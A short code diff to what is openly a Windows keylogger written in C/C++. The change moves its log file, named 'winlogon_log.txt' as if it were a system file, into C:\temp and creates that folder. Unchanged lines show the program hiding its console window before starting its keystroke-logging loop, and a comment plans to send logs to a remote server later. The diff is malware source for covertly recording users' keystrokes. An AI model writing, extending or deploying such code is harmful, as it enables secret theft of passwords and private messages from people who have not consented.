@@ -6,8 +6,8 @@
 
 // log_file path can be changed
 // TODO: Connect to a remote server
-const TCHAR* log_file = L"D:\\winlogon_log.txt";
-
+LPCTSTR directoryPath = L"C:\\temp";
+const TCHAR* log_file = L"C:\\temp\\winlogon_log.txt";
 HANDLE hFile = NULL;
 HWND hWindowHandle = NULL;
 TCHAR currentWindowsName[1024] = { 0 };
@@ -208,9 +208,11 @@ DWORD main_logger() {
 	HWND hConsole = GetConsoleWindow();
 	ShowWindow(hConsole, SW_HIDE);
 	
-	// Open log file  (in append mode)
+	// Create log file
+	CreateDirectory(directoryPath, NULL);
 	hFile = _wfopen(log_file, L"a");
 	fclose((FILE*)hFile);
+		
 
 	// Main logging function
 	KeyLoggerMainFunction();
